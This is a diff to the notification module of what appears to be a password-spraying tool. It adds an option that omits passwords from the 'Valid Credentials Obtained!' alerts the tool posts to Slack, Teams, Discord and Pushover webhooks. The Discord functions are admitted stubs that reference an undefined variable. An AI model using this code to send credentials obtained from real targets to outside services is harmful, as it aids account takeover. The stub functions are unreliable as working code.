@@ -11,18 +11,19 @@ def notify_success(username, password, notify_obj):
     pushover_token = notify_obj['pushover_token']
     pushover_user = notify_obj['pushover_user']
     operator = notify_obj['operator_id']
+    exclude_password = notify_obj['exclude_password']
 
     if slack_webhook is not None:
-        slack_notify(username, password, operator, slack_webhook)
+        slack_notify(username, password, operator, exclude_password, slack_webhook)
 
     if pushover_token is not None and pushover_user is not None:
-        pushover_notify(username, password, operator, pushover_token, pushover_user)
+        pushover_notify(username, password, operator, exclude_password, pushover_token, pushover_user)
 
     if discord_webhook is not None:
-        discord_notify(username, password, operator, discord_webhook)
+        discord_notify(username, password, operator, exclude_password, discord_webhook)
 
     if teams_webhook is not None:
-        teams_notify(username, password, operator, teams_webhook)
+        teams_notify(username, password, operator, exclude_password, teams_webhook)
 
 
 def notify_update(message, notify_obj):
@@ -48,20 +49,24 @@ def notify_update(message, notify_obj):
 
 
 # Function for posting username/password to slack channel
-def slack_notify(username, password, operator, webhook):
+def slack_notify(username, password, operator, exclude_password, webhook):
 
     now = datetime.now()
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
-    insert = ""
+    op_insert = ""
     if operator is not None:
-        insert = f"Operator: {operator}\n"
+        op_insert = f"Operator: {operator}\n"
+
+    pwd_insert = f"Pass: {password}\n"
+    if exclude_password:
+        pwd_insert = ""
 
     text = ("```[Valid Credentials Obtained!]\n"
-            f"{insert}"
+            f"{op_insert}"
             f"User: {username}\n"
-            f"Pass: {password}\n"
+            f"{pwd_insert}"
             f"Date: {date}\n"
             f"Time: {time}```")
 
@@ -82,12 +87,12 @@ def slack_update(message, operator, webhook):
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
-    insert = ""
+    op_insert = ""
     if operator is not None:
-        insert = f"Operator: {operator}\n"
+        op_insert = f"Operator: {operator}\n"
 
     text = ("```[Log Entry]\n"
-            f"{insert}"
+            f"{op_insert}"
             f"{message}\n"
             f"Date: {date}\n"
             f"Time: {time}```")
@@ -102,7 +107,12 @@ def slack_update(message, operator, webhook):
 
 
 # Function for posting username/password to Discord
-def discord_notify(username, password, operator, webhook):
+def discord_notify(username, password, operator, exclude_password, webhook):
+    # TODO
+    # - implement operator optional addition
+    # - implement exclude_password optional arg
+    # - implement the actual discord notify function lol
+
     url = webhook
     data = {
     "content" : f"{message}",
@@ -113,6 +123,10 @@ def discord_notify(username, password, operator, webhook):
 
 # Discord notify message
 def discord_update(message, operator, webhook):
+    # TODO
+    # - implement operator optional addition
+    # - implement the actual discord notify function lol
+
     url = webhook
     data = {
     "content" : f"{message}",
@@ -122,22 +136,26 @@ def discord_update(message, operator, webhook):
 
 
 # Teams notify function
-def teams_notify(username, password, operator, webhook):
+def teams_notify(username, password, operator, exclude_password, webhook):
 
     now = datetime.now()
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
-    insert = ""
+    op_insert = ""
     if operator is not None:
-        insert = f"Operator: {operator}\n"
+        op_insert = f"Operator: {operator}\n"
+
+    pwd_insert = f"Pass: {password}\n"
+    if exclude_password:
+        pwd_insert = ""
 
     response = requests.post(
         url=webhook,
         content = ("[Valid Credentials Obtained!]\n"
-        f"{insert}"
+        f"{op_insert}"
         f"User: {username}\n"
-        f"Pass: {password}\n"
+        f"{pwd_insert}"
         f"Date: {date}\n"
         f"Time: {time}"),
         headers={"Content-Type": "application/json"},
@@ -157,14 +175,14 @@ def teams_update(message, operator, webhook):
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
-    insert = ""
+    op_insert = ""
     if operator is not None:
-        insert = f"Operator: {operator}\n"
+        op_insert = f"Operator: {operator}\n"
 
     response = requests.post(
         url=webhook,
         content = ("[Log Entry]\n"
-        f"{insert}"
+        f"{op_insert}"
         f"Message: {message}\n"
         f"Date: {date}\n"
         f"Time: {time}"),
@@ -180,7 +198,7 @@ def teams_update(message, operator, webhook):
 
 
 # Pushover notify of valid creds
-def pushover_notify(username, password, operator, token, user):
+def pushover_notify(username, password, operator, exclude_password, token, user):
 
     headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
 
@@ -188,13 +206,17 @@ def pushover_notify(username, password, operator, token, user):
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
-    insert = ""
+    op_insert = ""
     if operator is not None:
-        insert = f"Operator: {operator}\n"
+        op_insert = f"Operator: {operator}\n"
 
-    text = (f"{insert}"
+    pwd_insert = f"Pass: {password}\n"
+    if exclude_password:
+        pwd_insert = ""
+
+    text = (f"{op_insert}"
             f"User: {username}\n"
-            f"Pass: {password}\n"
+            f"{pwd_insert}"
             f"Date: {date}\n"
             f"Time: {time}")
 
@@ -218,11 +240,11 @@ def pushover_update(message, operator, token, user):
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
-    insert = ""
+    op_insert = ""
     if operator is not None:
-        insert = f"Operator: {operator}\n"
+        op_insert = f"Operator: {operator}\n"
 
-    text = (f"{insert}"
+    text = (f"{op_insert}"
             f"{message}\n"
             f"Date: {date}\n"
             f"Time: {time}")
